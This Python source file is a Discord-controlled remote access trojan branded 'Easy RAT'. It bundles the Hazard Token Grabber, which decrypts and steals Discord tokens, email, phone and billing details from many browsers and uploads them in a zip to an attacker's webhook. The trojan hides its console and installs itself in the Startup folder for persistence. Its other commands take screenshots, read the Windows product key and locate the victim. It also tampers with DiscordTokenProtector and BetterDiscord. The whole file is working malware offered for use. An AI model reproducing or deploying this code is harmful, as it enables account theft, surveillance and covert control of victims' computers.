import ctypes
ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )

import os
import json
import httpx
import shutil
import psutil
import string
import tkinter
import discord
import pyttsx3
import asyncio
import zipfile
import threading
import webbrowser
import subprocess

from sys import argv
from re import findall 
from random import choice
from PIL import ImageGrab
from base64 import b64decode
from tempfile import mkdtemp
from Crypto.Cipher import AES
from datetime import datetime
from discord.commands import Option
from win32crypt import CryptUnprotectData


# change here
bot_token = "BotToken"
guildId = GuildId
ping_on_start = True

# global variables (dont change)
victim = os.getlogin()
roaming = os.getenv("appdata")
victim_pc = os.getenv("COMPUTERNAME")
bot = discord.Bot(debug_guilds=[guildId])
ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
colors = [
    discord.Colour.red(), 
    discord.Colour.orange(), 
    discord.Colour.gold(), 
    discord.Colour.green(),
    discord.Colour.blue(), 
    discord.Colour.purple(),
    discord.Colour.greyple(),
    discord.Colour.brand_green(),
    discord.Colour.brand_red(),
    discord.Colour.dark_blue(),
    discord.Colour.dark_purple(),
    discord.Colour.nitro_pink()
]


#actual code
try:
    directory = roaming + '\\WindowsCache'
    if not os.path.exists(directory):
        os.makedirs(directory)
    print(f"Dev print: folder created at {directory}")
except:
    # directory already exists
    print(f"Dev print: folder already exists at {directory}")

try:
    directory = roaming + '\\WindowsCache\\id cache.txt'
    if not os.path.exists(directory):
        with open(directory, mode="w") as id:
            numbers = string.digits
            upperLetters = string.ascii_uppercase
            bothTypes = numbers + upperLetters
            randomID = ''.join(choice(bothTypes) for i in range(4))
            id.write(f"{victim_pc}-{randomID}")
        id.close()
        print("Dev print: Created id!")
except FileExistsError:
    print(f"Dev print: already has id")

@bot.event
async def on_ready():
    print(f"Dev print: {bot.user} is online")
    directory = roaming + '\\WindowsCache\\id cache.txt'
    idReader = open(directory, "r")
    country = "None"
    req = httpx.get("https://ipinfo.io/json")
    if req.status_code == 200:
        data = req.json()
        country = data.get('country')
    today = datetime.now()
    d2 = today.strftime("%B/%d/%Y %H:%M:%S")
    guild = bot.get_guild(guildId)
    f = await guild.create_text_channel(name=f"Session {victim}", topic=f"PC id: {idReader.read()}")
    idReader = open(directory, "r")

    embed = discord.Embed(
        title=f"New victim {victim}",
        color=choice(colors),
        url="https://github.com/Cryxyemi/Simple-RAT"
    )
    embed.add_field(
        name=f"{victim} | {victim_pc}",
        value=f"""
        Make sure that you setup the webhook using /setup_webhook if you havent yet
        -----------------------------------------
        The id from the computer: {idReader.read()}
        -----------------------------------------
        {victim} executed your program at: {d2}
        -----------------------------------------
        {victim} is from {country}
        """
    )
    embed.set_footer(text="Thank you for choosing Easy RAT")

    if ping_on_start == True:
        await f.send("@everyone")
    embedMessage = await f.send(embed=embed)

@bot.slash_command(description="Makes a popup message on the victims screen")
async def popup_message(ctx, pc_id: str, message: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    print(f"Dev print: message is {message}")
    await ctx.respond("Please wait until the popup window i closed or the program crashes, you get notified by the webhook you set up")
    await ctx.send("Command executed!")
    def func1(evt=None):
        embed = {
            'avatar_url': 'https://cdn.discordapp.com/attachments/766732210953912360/1009168003088273419/unknown.png',
            'embeds': [
                {
                    'author': {
                        'name': f'{victim} closed your popup window',
                        'url': 'https://github.com/Cryxyemi',
                        'icon_url': 'https://cdn.discordapp.com/attachments/766732210953912360/1009166330848624720/unknown.png'
                    },
                    'color': 176185,
                    'description': f'{victim} closed your popup window',
                    'footer': {
                        'text': 'Thank you for choosing Easy RAT'
                    }
                }
            ]
        }
        f = open(roaming + "\\WindowsCache\\web cache.txt", "r")
        httpx.post(f.read(), json=embed)
        rootWindow.destroy()

    rootWindow = tkinter.Tk()
    w = tkinter.Label(rootWindow, text=f"{message}")
    e = tkinter.Button(rootWindow, text="Close", command=func1)
    w.pack()
    e.pack()
    rootWindow.eval('tk::PlaceWindow . center')
    rootWindow.attributes("-topmost", True)
    rootWindow.overrideredirect(True)
    rootWindow.mainloop()

@bot.slash_command(description="simply text to speech")
async def text_to_speech(ctx, pc_id: str, message: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    print(f"Dev print: speaked {message}")
    await ctx.respond("Command executed!")
    engine = pyttsx3.init()
    engine.say(message)
    engine.runAndWait()

@bot.slash_command(description="Takes a screenshot")
async def screenshot(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    dirFile = mkdtemp()
    image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
    image.save(dirFile + "\\Screenshot.png")
    with open(dirFile + '\\Screenshot.png', 'rb') as f:
        picture = discord.File(f)
        await ctx.send(file=picture)
    image.close()
    await ctx.respond("Command executed!")

@bot.slash_command(description="Shows the ip, hardware info and more")
async def pc_info(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
    req = httpx.get("https://ipinfo.io/json")
    if req.status_code == 200:
        data = req.json()
        ip = data.get('ip')
        city = data.get('city')
        country = data.get('country')
        region = data.get('region')
        org = data.get('org')
        loc = data.get('loc')
        googlemap = "https://www.google.com/maps/search/google+map++" + loc

    try:
        HWID = subprocess.check_output("wmic csproduct get uuid", creationflags=0x08000000).decode().split('\n')[1].strip()
    except Exception:
        HWID = "N/A"
    try:
        wkey = subprocess.check_output(
            "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
            creationflags=0x08000000).decode().rstrip()
    except Exception:
        wkey = "N/A"
    try:
        winver = subprocess.check_output("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName",
                                            creationflags=0x08000000).decode().rstrip()
    except Exception:
        winver = "N/A"
    available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
    
    embed = discord.Embed(
        title=f"Infos from {victim}",
        color=choice(colors),
        url="https://github.com/Cryxyemi/Simple-RAT"
    )

    embed.add_field(
        name="Network infos",
        value=f"""
        -----------------------------------------
        googlemaps: {googlemap}
        ip: {ip}
        city: {city}
        country: {country}
        region: {region}
        org: {org}
        loc: {loc}""",
        inline=False
    )
    embed.add_field(
        name="PC info",
        value=f"""
        -----------------------------------------
        PC Name: {victim_pc}
        HWID: {HWID}
        Windows key: {wkey}
        Windows version: {winver}
        RAM: {ram}GB
        DISK: {disk}GB
        DRIVES = {', '.join(available_drives)}
        """,
        inline=False
    )

    await ctx.respond(embed=embed)
    await ctx.respond("Command executed!")

# credits to ilylunar for the token grabber link: https://github.com/ilylunar/Hazard-Token-Grabber-V2
@bot.slash_command(description="Grabs the token")
async def grab_token(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    config = {
    'webhook': 123
    }

    class Functions(object):
        @staticmethod
        def get_headers(token: str = None):
            headers = {
                "Content-Type": "application/json",
            }
            if token:
                headers.update({"Authorization": token})
            return headers

        @staticmethod
        def get_master_key(path) -> str:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        @staticmethod
        def decrypt_val(buff, master_key) -> str:
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception:
                return "Failed to decrypt password"




        @staticmethod
        def fetch_conf(e: str) -> str or bool | None:
            return config.get(e)


    class HazardTokenGrabberV2(Functions):
        def __init__(self):
            self.webhook = self.fetch_conf('webhook')
            self.discordApi = "https://discord.com/api/v9/users/@me"
            self.appdata = os.getenv("localappdata")
            self.roaming = os.getenv("appdata")
            self.chrome = self.appdata + "\\Google\\Chrome\\User Data\\"
            self.dir = mkdtemp()
            self.hook_reg = "api/webhooks"
            self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

            self.sep = os.sep
            self.tokens = []
            self.robloxcookies = []

            os.makedirs(self.dir, exist_ok=True)

        def try_extract(func):
            '''Decorator to safely catch and ignore exceptions'''
            def wrapper(*args, **kwargs):
                try:
                    func(*args, **kwargs)
                except Exception:
                    pass
            return wrapper

        async def checkToken(self, tkn: str) -> str:
            try:
                r = httpx.get(
                    url=self.discordApi,
                    headers=self.get_headers(tkn),
                    timeout=5.0
                )
            except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
                pass
            if r.status_code == 200 and tkn not in self.tokens:
                self.tokens.append(tkn)

        async def init(self):
            if self.webhook == "":
                os._exit(0)
            await self.bypassBetterDiscord()
            await self.bypassTokenProtector()
            function_list = [self.grab_tokens]
            for func in function_list:
                process = threading.Thread(target=func, daemon=True)
                process.start()
            for t in threading.enumerate():
                try:
                    t.join()
                except RuntimeError:
                    continue
            self.neatifyTokens()

        async def bypassTokenProtector(self):
            # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
            tp = f"{self.roaming}\\DiscordTokenProtector\\"
            if not os.path.exists(tp):
                return
            config = tp + "config.json"

            for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
                try:
                    os.remove(tp + i)
                except FileNotFoundError:
                    pass
            if os.path.exists(config):
                with open(config, errors="ignore") as f:
                    try:
                        item = json.load(f)
                    except json.decoder.JSONDecodeError:
                        return
                    item['Rdimo_just_shit_on_this_token_protector'] = "https://github.com/Rdimo"
                    item['auto_start'] = False
                    item['auto_start_discord'] = False
                    item['integrity'] = False
                    item['integrity_allowbetterdiscord'] = False
                    item['integrity_checkexecutable'] = False
                    item['integrity_checkhash'] = False
                    item['integrity_checkmodule'] = False
                    item['integrity_checkscripts'] = False
                    item['integrity_checkresource'] = False
                    item['integrity_redownloadhashes'] = False
                    item['iterations_iv'] = 364
                    item['iterations_key'] = 457
                    item['version'] = 69420
                with open(config, 'w') as f:
                    json.dump(item, f, indent=2, sort_keys=True)
                with open(config, 'a') as f:
                    f.write("\n\n//Rdimo just shit on this token protector | https://github.com/Rdimo")

        async def bypassBetterDiscord(self):
            bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
            if os.path.exists(bd):
                x = self.hook_reg
                with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                    txt = f.read()
                    content = txt.replace(x, 'RdimoTheGoat')
                with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                    f.write(content)

        @try_extract
        def grab_tokens(self):
            paths = {
                'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
                'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
                'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
                'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
                'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
                'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
                'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
                'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
                'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
                'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
                'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
                '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
                'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
                'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
                'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
                'Chrome': self.chrome + 'Default\\Local Storage\\leveldb\\',
                'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
                'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
                'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
                'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
                'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
            }

            for name, path in paths.items():
                if not os.path.exists(path):
                    continue
                disc = name.replace(" ", "").lower()
                if "cord" in path:
                    if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                        for file_name in os.listdir(path):
                            if file_name[-3:] not in ["log", "ldb"]:
                                continue
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                                for y in findall(self.encrypted_regex, line):
                                    token = self.decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                    asyncio.run(self.checkToken(token))
                else:
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                asyncio.run(self.checkToken(token))

            if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                    for _file in files:
                        if not _file.endswith('.sqlite'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                            for token in findall(self.regex, line):
                                asyncio.run(self.checkToken(token))





        def neatifyTokens(self):
            f = open(self.dir + "\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
            for token in self.tokens:
                j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
                user = j.get('username') + '#' + str(j.get("discriminator"))

                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Developer, "
                if (badges == ""):
                    badges = "None"

                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
                nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)
                billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
            f.close()


            _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{victim}].zip')
            zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
            abs_src = os.path.abspath(self.dir)
            for dirname, _, files in os.walk(self.dir):
                for filename in files:
                    absname = os.path.abspath(os.path.join(dirname, filename))
                    arcname = absname[len(abs_src) + 1:]
                    zipped_file.write(absname, arcname)
            zipped_file.close()

            files_found = ''
            for f in os.listdir(self.dir):
                files_found += f"・{f}\n"
            tokens = ''
            for tkn in self.tokens:
                tokens += f'{tkn}\n\n'
            fileCount = f"{len(files)} Files Found: "

            embed = {
                'avatar_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif',
                'embeds': [
                    {
                        'author': {
                            'name': f'*{victim}* got token grabbed',
                            'url': 'https://github.com/Rdimo/Hazard-Token-Grabber-V2',
                            'icon_url': 'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'
                        },
                        'color': 176185,
                        'description': '',
                        'fields': [
                            {
                                'name': '**Tokens:**',
                                'value': f'''```yaml
                                    {tokens if tokens else "No tokens extracted"}```
                                '''.replace(' ', ''),
                                'inline': False
                            }
                        ],
                        'footer': {
                            'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
                        }
                    }
                ]
            }
            with open(_zipfile, 'rb') as f:
                if self.hook_reg in self.webhook:
                    ff = open(roaming + "\\WindowsCache\\web cache.txt", "r")
                    httpx.post(ff, json=embed)
                    fff = open(roaming + "\\WindowsCache\\web cache.txt", "r")
                    httpx.post(fff, files={'upload_file': f})
                else:
                    from pyotp import TOTP
                    key = TOTP(self.fetch_conf('webhook_protector_key')).now()
                    httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
                    httpx.post(self.webhook, headers={"Authorization": key}, files={'upload_file': f})
            os.remove(_zipfile)
            shutil.rmtree(self.dir, ignore_errors=True)


    if __name__ == "__main__" and os.name == "nt":
        try:
            httpx.get('https://google.com')
        except httpx.ConnectTimeout:
            os._exit(0)
        asyncio.run(HazardTokenGrabberV2().init())
        await ctx.respond("Command executed!")

@bot.slash_command(description="Open a url")
async def open_link(ctx, pc_id: str, link: Option(str, "The link from a website, example: https://www.google.com/")):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    webbrowser.open(link)
    await ctx.respond("Command executed!")

@bot.slash_command(description="Add the rat to the startup folder")
async def add_startup(ctx, pc_id: str):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    startup_loc = roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    try:
        shutil.copy2(argv[0], startup_loc)
    except Exception:
        pass
    await ctx.respond("Command executed!")

@bot.slash_command(description="If your text channel is too messy")
async def clear(ctx, amount: Option(int, "The amount to purge, max 100", min_value=1, max_value=100)):
    messagess = await ctx.channel.purge(limit=amount)
    await ctx.respond(f"Deleted {len (messagess)} messages")

@bot.slash_command(description="setup webhook for commands that requires a webhook")
async def setup_webhook(ctx, pc_id: str, webhook: Option(str, "Your webhook link")):
    idReader = open(directory, "r")
    if pc_id != idReader.read():
        return
    directory = roaming + '\\WindowsCache\\'
    try:
        os.remove(directory + '\\web cache.txt')
        print("Removed file")
        await asyncio.sleep(1)
    except:
        print("Could not remove file")
    with open(directory + '\\web cache.txt', mode='w') as f:
        f.write(webhook)
        print("Added file")
        print(f"Dev print: created webhook {directory}")
    f.close()
    await ctx.respond("Command executed!")

@bot.slash_command(description="Set the bot status")
async def set_status(ctx, 
    status_type: Option(str, "The type", choices=["Playing", "Streaming", "Listening", "Watching"]), 
    status_text: Option(str, "The text that should show"), 
    twitch_url: Option(str, "This is required if you choose Streaming", default=None)):
    if status_type == "Playing":
        await bot.change_presence(activity=discord.Game(name=status_text))
    if status_type == "Streaming":
        await bot.change_presence(activity=discord.Streaming(name=status_text, url=twitch_url))
    if status_type == "Listening":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status_text))
    if status_type == "Watching":
        await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status_text))
    await ctx.respond("Command executed!")


if __name__ == "__main__":
    try:
        httpx.get('https://google.com')
    except httpx.ConnectTimeout:
        os._exit(0)
    bot.run(bot_token)
